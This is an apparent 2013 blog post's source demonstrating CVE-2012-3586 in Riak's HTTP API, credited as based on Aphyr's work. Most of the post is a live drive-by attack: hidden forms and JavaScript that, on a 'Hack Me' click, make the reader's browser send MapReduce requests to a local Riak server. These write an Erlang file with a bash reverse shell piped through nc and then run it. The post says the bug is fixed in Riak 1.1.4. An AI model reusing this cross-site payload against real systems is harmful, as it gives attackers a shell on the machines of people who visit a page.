---
layout: post
title: "Riak Drive by Attack"
date: 2013-09-01 21:29
comments: true
categories: 
---
Be careful with Riak HTTP API (CVE-2012-3586)
---------------------------------------------

This has been fixed in [Riak 1.1.4](http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html)

I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.

This is heavily based on [Aphyr’s work](http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet). I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.

The attack will perform the following actions

1. Write the value `lols=lols` to the `key i_can_run_better` in bucket `everything_you_can_run`
2. Write the value `spawn(fun() -> os:cmd("mkfifo /tmp/mypipe.$$ && cat /tmp/mypipe.$$ | /bin/bash -i 2>&1 | nc localhost 6666 > /tmp/mypipe.$$") end)` to the file `/tmp/evil.erl`
3. Evalute the contents of `/tmp/evil.erl` using the erlang function `file:path_eval`. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.

By clicking ‘Hack Me’ you agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. 

Click ‘Hack Me’ below to start the attack.

{% raw %}
<iframe id='insert_record_frame' name='insert_record_frame' style='display:none;width:0px;height:0px'></iframe>


<p><form action='http://localhost:8098/riak/everything_you_can_run/i_can_run_better' id='insert_record_form' method='POST' target='insert_record_frame'>
  <input name='lols' type='hidden' value='lols' />
</form></p>

<iframe id='write_file' name='write_file' style='display:none;width:0px;height:0px'></iframe>


<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='write_file_form' method='POST' target='write_file'>
  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run","i_can_run_better"]],"query":[{"map":{"language":"javascript","source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}},{"reduce":{"language":"erlang","module":"file","function":"write_file","arg":"spawn(fun() -&gt; os:cmd(\"mkfifo /tmp/mypipe.$$  &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$\") end)."}}]}' />
</form></p>

<iframe id='evaluate_file' name='evaluate_file' style='display:none;width:0px;height:0px'></iframe>


<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='evaluate_file_form' method='POST' target='evaluate_file'>
  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run", "i_can_run_better"]], "query":[{"map":{"language":"javascript", "source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}}, {"reduce":{"language":"erlang", "module":"file", "function":"path_eval", "arg":"/tmp/evil.erl"}}]}' />
</form>
<input id='hack_me' type='button' value='Hack Me' /></p>

<script type='text/javascript'>
  //<![CDATA[
    $("#hack_me").click(function() {
        if (confirm("You agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. ")) {
            $("#insert_record_form")[0].submit();
            setTimeout(write_file, 1000);
        }
    });
    
    function write_file() {
        $("#write_file_form")[0].submit();
        setTimeout(evaluate_file, 1000);           
    }
    
    function evaluate_file() {
        $("#evaluate_file_form")[0].submit();          
    }
  //]]>
</script>

{% endraw %}
